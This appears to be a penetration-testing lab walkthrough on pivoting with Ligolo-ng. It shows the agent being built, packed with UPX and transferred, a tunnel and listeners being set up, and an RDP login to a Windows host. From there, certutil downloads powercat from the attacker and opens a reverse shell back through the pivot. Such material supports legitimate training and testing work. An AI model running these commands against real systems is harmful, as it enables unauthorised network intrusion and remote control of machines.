# Ligolo-ng

## [Building](https://docs.ligolo.ng/InstallBuild/)

```sh
my@attack:~$ git clone https://github.com/nicocha30/ligolo-ng.git
my@attack:~$ cd ligolo-ng
my@attack:~/ligolo-ng$ CGO_ENABLED=0 go build -o ligolo-agent cmd/agent/main.go
my@attack:~/ligolo-ng$ CGO_ENABLED=0 go build -o ligolo-proxy cmd/proxy/main.go
```

## Compressing the Binary

```sh
my@attack:~/ligolo-ng$ chmod +x ligolo-agent
my@attack:~/ligolo-ng$ upx --brute --no-lzma ligolo-agent
```

```output title="Output" hl_lines="7"
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.0       Markus Oberhumer, Laszlo Molnar & John Reiser   May 16th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
  10469118 ->   6002804   57.34%   linux/amd64   ligolo-agent

Packed 1 file.
```

## Creating Tunnel Interface

```sh
my@attack:~/ligolo-ng$ sudo ip tuntap add user my mode tun ligolo
my@attack:~/ligolo-ng$ sudo ip link set ligolo up
my@attack:~/ligolo-ng$ ip addr show ligolo
```

```output title="Output"
4: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500
    link/none
```

## Transferring Agent to Pivot

```sh
my@attack:~/ligolo-ng$ scp ligolo-agent ubuntu@10.129.115.39:/tmp
```

## Setting Up

### Starting Proxy Server on Attack Machine

```sh
my@attack:~/ligolo-ng$ ./ligolo-proxy -laddr 0.0.0.0:11601 -selfcert -nobanner
```

```output title="Output"
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
```

### Connecting to Attack Machine from Pivot

```sh
ubuntu@WEB01:~$ /tmp/ligolo-agent -connect 10.10.14.122:11601 -ignore-cert
```

```output title="Output"
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.14.122:11601"
```

### Specifying a Session

```sh
ligolo-ng » session
```

### Displaying Pivot Network Configuration

```sh
[Agent : ubuntu@WEB01] » ifconfig
```

| NAME | IPV4 ADDRESS |
|---|---|
| lo | 127.0.0.1/8 |
| ens192 | 10.129.115.39/16 |
| ens224 | 172.16.5.129/23 |

### Adding a Route

```sh
my@attack:~/ligolo-ng$ sudo ip route add 172.16.5.0/24 dev ligolo
```

### Starting the Tunneling

```sh
[Agent : ubuntu@WEB01] » tunnel_start
```

```output title="Output"
INFO[0389] Starting tunnel to ubuntu@WEB01 (005056b05f91)
```

## [Listeners](https://docs.ligolo.ng/Listeners/)

### Adding a Listener for File Transferring

```sh
[Agent : ubuntu@WEB01] » listener_add --addr 0.0.0.0:10000 --to 127.0.0.1:8080 --tcp
```

```output title="Output"
INFO[0542] Listener 0 created on remote agent!
```

### Adding a Listener for Reverse Shell

```sh
[Agent : ubuntu@WEB01] » listener_add --addr 0.0.0.0:20000 --to 127.0.0.1:9001 --tcp
```

```output title="Output"
INFO[0547] Listener 1 created on remote agent!
```

### Listing Listeners

```sh
[Agent : ubuntu@WEB01] » listener_list
```

| # | AGENT LISTENER ADDRESS | PROXY REDIRECT ADDRESS |
|---|---|---|
| 0 | 0.0.0.0:10000 | 127.0.0.1:8080 |
| 1 | 0.0.0.0:20000 | 127.0.0.1:9001 |

## Ping Test

```sh
my@attack:~$ ping 172.16.5.129 -c 4
```

```output title="Output"
PING 172.16.5.129 (172.16.5.129) 56(84) bytes of data.
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=254 ms
64 bytes from 172.16.5.129: icmp_seq=2 ttl=64 time=375 ms
64 bytes from 172.16.5.129: icmp_seq=3 ttl=64 time=187 ms
64 bytes from 172.16.5.129: icmp_seq=4 ttl=64 time=209 ms

--- 172.16.5.129 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 186.771/256.119/374.939/72.784 ms
```

## Web Server

```sh
my@attack:~$ git clone https://github.com/besimorhino/powercat.git
my@attack:~$ cd powercat
my@attack:~/powercat$ python3 -m http.server 8080
```

## xFreeRDP

```sh
my@attack:~$ xfreerdp /v:172.16.5.19 /u:'victor' /p:'pass@123'
```

## Downloading [PowerCat](https://github.com/besimorhino/powercat) on Windows

```pwsh
PS C:\Users\victor> certutil.exe -urlcache -split -f "http://172.16.5.129:10000/powercat.ps1" powercat.ps1
```

```output title="Output"
****  Online  ****
  0000  ...
  9323
CertUtil: -URLCache command completed successfully.
```

## Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

## Getting Reverse Shell

```pwsh
PS C:\Users\victor> Import-Module .\powercat.ps1
PS C:\Users\victor> powercat -c 172.16.5.129 -p 20000 -ep
```
